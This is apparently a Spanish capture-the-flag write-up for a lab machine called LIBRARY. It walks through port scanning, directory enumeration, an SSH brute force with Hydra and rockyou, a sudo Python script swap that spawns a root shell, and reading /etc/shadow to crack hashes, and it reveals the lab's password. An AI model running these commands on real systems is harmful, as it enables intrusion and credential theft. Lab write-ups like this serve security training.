---
layout: default
---

# MÃ¡quina LIBRARY

# Fase 1: Reconocimiento y EnumeraciÃ³n

### **1. Escaneo de Puertos (Nmap)**

- **Comando**

```bash
sudo nmap -p- --open -sS -Pn -sV -sC --min-rate 5000 10.81.161.0<br>
```

![image.png](image.png)

Una vez hecho el escaneo accedemos al servicio web (puerto 80) para realizar OSINT.

### 2. EnumeraciÃ³n de Directorios (Gobuster)

Se realiza un ataque de diccionario sobre la estructura de directorios del servidor web para localizar recursos no enlazados pÃºblicamente.

**Comando:**

```bash
gobuster dir -u http://10.81.161.0 -w /usr/share/wordlists/dirb/common.txt -x php,tx
```

![image.png](image%201.png)

Abrir en el navegador `http://[IP-Victima]/robots.txt`

### 3. AnÃ¡lisis del archivo Robots.txt

Se inspecciona el archivo `/robots.txt` para obtener pistas sobre la configuraciÃ³n del servidor.

- **Hallazgo:** El archivo muestra la cadena `User-agent: rockyou`

![image.png](image%202.png)

- Esto sugiere el uso de diccionarios de contraseÃ±as estandar rockyou.txt.

### 4. IdentificaciÃ³n del Vector de Ataque Final

Tras analizar el servicio web, se consolidan las pistas obtenidas para definir la estrategia de intrusiÃ³n:

1. **Nombre de Usuario:** En la pÃ¡gina principal del blog (`index.html`), se identifica a **`meliodas`** como el autor y administrador del sitio.

![image.png](image%203.png)

## Fase 2: Acceso Inicial (ExplotaciÃ³n)

Con la informaciÃ³n recolectada, se inicia el proceso de obtenciÃ³n de credenciales para acceder al servidor.

### 1. Ataque de Fuerza Bruta (Hydra)

Se utiliza la herramienta **Hydra** para automatizar el intento de inicio de sesiÃ³n mÃºltiple sobre el protocolo SSH.

- **Comando:**Bash
    
    ```bash
    hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.81.161.0
    ```
    

(En caso de que venga el archivo de rockyou.txt sin descomrpimir, se hace con el siguiente comando)

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 2. Lanzar Hydra

Bash

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.81.161.0 -t 4
```

![image.png](image%204.png)

Obtenemos el usuario (meliodas) y la contraseÃ±a (iloveyou1)

### 3. ConexiÃ³n Inicial

Con las credenciales obtenidas, se procede a establecer una sesiÃ³n SSH para interactuar con el sistema operativo.

Con las credenciales obtenidas, se procede a establecer una sesiÃ³n SSH para interactuar con el sistema operativo.

- **Comando de acceso:**Bash
    
    `ssh meliodas@10.81.161.0`
    

![image.png](image%205.png)

### Fase 3: Post-ExplotaciÃ³n y Escalada de Privilegios (Root)

### 1. EnumeraciÃ³n de privilegios SUDO

El primer paso en cualquier auditorÃ­a interna es revisar quÃ© comandos puede ejecutar el usuario actual con permisos de superusuario sin conocer la contraseÃ±a de root.

- **Comando:**Bash
    
    `sudo -l`
    
- **Hallazgo:** El usuario puede ejecutar el intÃ©rprete de **Python** sobre el script `/home/meliodas/bak.py` con privilegios de superusuario y sin proporcionar contraseÃ±a.

![image.png](image%206.png)

EliminaciÃ³n del Script Protegido

Aunque el archivo `bak.py` estÃ¡ protegido contra escritura, al residir en la carpeta `/home/meliodas/` (sobre la cual tenemos control total), es posible eliminarlo.

- **Comando:**Bash
    
    `rm /home/meliodas/bak.py`
    

### CreaciÃ³n del Script Malicioso

Se genera un nuevo archivo con el mismo nombre, inyectando cÃ³digo en Python diseÃ±ado para invocar una shell del sistema.

- **Comando:**Bash
    
    `echo 'import os; os.system("/bin/bash")' > /home/meliodas/bak.py`
    

### EjecuciÃ³n y ElevaciÃ³n a Root

Se aprovecha el privilegio de `sudo` identificado anteriormente para ejecutar el nuevo script. Al ser ejecutado por el intÃ©rprete de Python con permisos de superusuario, el cÃ³digo inyectado nos devuelve una shell con privilegios mÃ¡ximos.

- **Comando:**Bash
    
    `sudo /usr/bin/python3 /home/meliodas/bak.py`
    

### ConfirmaciÃ³n de Superusuario

Se verifica la identidad del usuario tras la ejecuciÃ³n.

- **Comando:** `whoami`
- **Resultado:** `root`

![image.png](image%207.png)

### ExtracciÃ³n de Secretos del Sistema (Hashes)

Como usuario root, se accede al archivo `/etc/shadow`, el cual es inaccesible para usuarios normales. Este archivo almacena los hashes de las contraseÃ±as de todos los usuarios del sistema.

- **Comando ejecutado:**Bash
    
    `cat /etc/shadow | grep -E "root|meliodas"`
    

![image.png](image%208.png)

Para hacer el crackeo y obtener las contraseÃ±as usaremos jon the ripper en ambas, aunque no consigamos las contraseÃ±as podemos cambiarlas al ser super usuario.

Root

![image.png](image%209.png)

User: meliodas contraseÃ±a: iloveyou1

![image.png](image%2010.png)

![image.png](image%2011.png)
